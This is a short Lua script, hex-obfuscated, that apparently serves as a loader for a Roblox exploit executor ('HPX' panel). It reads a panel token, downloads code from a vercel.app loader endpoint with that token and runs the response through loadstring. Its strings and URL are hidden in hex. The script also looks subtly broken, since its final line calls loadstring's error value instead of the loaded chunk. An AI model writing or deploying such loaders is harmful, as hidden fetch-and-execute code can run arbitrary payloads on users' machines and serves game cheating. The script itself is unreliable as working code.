local function d(x)local t={}for i=1,#x,2 do t[#t+1]=string.char(tonumber(x:sub(i,i+1),16))end return table.concat(t)end
local F,S=d("66756e6374696f6e"),d("737472696e67")
local E=(type(getgenv)==F and getgenv())or _G
local T=E[d("4850585f50414e454c5f544f4b454e")]
if type(T)~=S or #T<40 then error(d("5b4850585d20446566696e61206f20746f6b656e20646f207061696e656c20616e746573206465206578656375746172206f206c6f616465722e"),0)end
local H=(type(request)==F and request)or(type(http_request)==F and http_request)or(syn and type(syn.request)==F and syn.request)
if not H then error(d("5b4850585d2046616c686120646520636f6e6578c3a36f20636f6d206f207061696e656c2e"),0)end
local O,A=pcall(H,{Url=d("68747470733a2f2f6870787061696e6e656c2d736f757263652d76657263656c2e76657263656c2e6170702f6170692f70616e656c2f6c6f61646572"),Method=d("474554"),Headers={[d("417574686f72697a6174696f6e")]=d("42656172657220")..T},Timeout=15})
if not O or type(A)~="table" then error(d("5b4850585d2046616c686120646520636f6e6578c3a36f20636f6d206f207061696e656c2e"),0)end
local C=tonumber(A[d("537461747573436f6465")]or A[d("537461747573")])or 0
local B=A[d("426f6479")]
if C~=200 or type(B)~=S or #B<1000 then error(d("5b4850585d20546f6b656e20657870697261646f206f75206ec3a36f206175746f72697a646f2e"),0)end
local L,Q=loadstring(B)
if not L then error(d("5b4850585d20526573706f73746120696e76c3a16c69646120646f207061696e656c2e"),0)end
return Q()
